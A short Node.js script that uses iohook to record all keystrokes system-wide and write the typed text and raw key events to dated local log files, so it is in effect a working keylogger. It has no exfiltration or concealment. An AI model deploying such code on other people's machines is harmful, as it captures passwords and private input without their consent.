"use strict";
var iohook = require("iohook");
let fs = require("fs");
let d = new Date();
let date = d.getDate() < 10 ? "0" + d.getDate() : d.getDate();
let month = d.getMonth() + 1 < 10 ? "0" + (d.getMonth() + 1) : (d.getMonth() + 1);
let dir = `history/${date}${month}${d.getFullYear()}`
let log = `${dir}/log.json`
let text = `${dir}/text.txt`;

if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, {recursive: true}, err => {
        if (err) throw err
    })
}

if (!fs.existsSync(log)) {
    fs.writeFileSync(log, "[]", "utf-8")
}
if (!fs.existsSync(text)) {
    fs.writeFileSync(text, `${date}/${month}/${d.getFullYear()}\n`, "utf-8")
}

let sessionText = "";
var sessionTime;
iohook.on("keypress", e => {
    clearTimeout(sessionTime)
    if (e.keychar == 8) {
        sessionText = sessionText.slice(0, -1)
    } else if (e.keychar == 99 && e.ctrlKey) {
        sessionText += " CTRL + C "
    } else if (e.keychar == 118 && e.ctrlKey) {
        sessionText += " CTRL + V "
    } else if (e.keychar == 9) {
    } else {
        sessionText += String.fromCharCode(e.keychar);
    }


    sessionTime = setTimeout(() => {
        if (sessionText != "") {
        let logs = fs.readFileSync(log, "utf-8");
        let texts = fs.readFileSync(text, "utf-8");
        let parseLogs = JSON.parse(logs);

        let d = new Date();

        let hours = d.getHours() < 10 ? "0" + d.getHours() : d.getHours();
        let minutes = d.getMinutes() < 10 ? "0" + d.getMinutes() : d.getMinutes();
        let seconds = d.getSeconds() < 10 ? "0" + d.getSeconds() : d.getSeconds();

        sessionText = `- ${hours}:${minutes}:${seconds}\n${sessionText}\n`
        
        parseLogs.push({...e, time: `${d.getDate()}-${d.getMonth()}-${d.getFullYear()} ${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`})
        fs.writeFileSync(text, texts + sessionText, "utf-8")
        fs.writeFileSync(log, JSON.stringify(parseLogs), "utf-8")
        sessionText = "";
    }
    }, 2000)
})

iohook.start();